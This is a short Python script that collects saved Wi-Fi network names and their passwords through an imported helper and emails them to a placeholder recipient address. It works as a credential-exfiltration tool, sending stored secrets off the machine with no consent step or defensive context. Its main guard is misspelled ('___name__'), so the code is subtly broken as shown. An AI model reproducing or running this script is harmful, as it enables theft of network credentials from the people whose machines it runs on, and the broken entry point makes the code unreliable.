from wifi_info import get_wifi_info
from email_sender import send_email

def main():
    """
    Main function to retrieve Wi-Fi information and send it via email.
    """
    # Get Wi-Fi information
    wifi_info = get_wifi_info()

    # Format the Wi-Fi information into a string
    wifi_info_str = "\n".join([f"SSID: {ssid}, Password: {password}" for ssid, password in wifi_info.items()])

    # Send the Wi-Fi information via email
    to_email = "recipient@example.com"  # Replace with the recipient's email
    subject = "Wi-Fi Information"
    body = f"Here is the Wi-Fi information:\n{wifi_info_str}"
    send_email(to_email, subject, body)

if ___name__ == "__main__":
    main()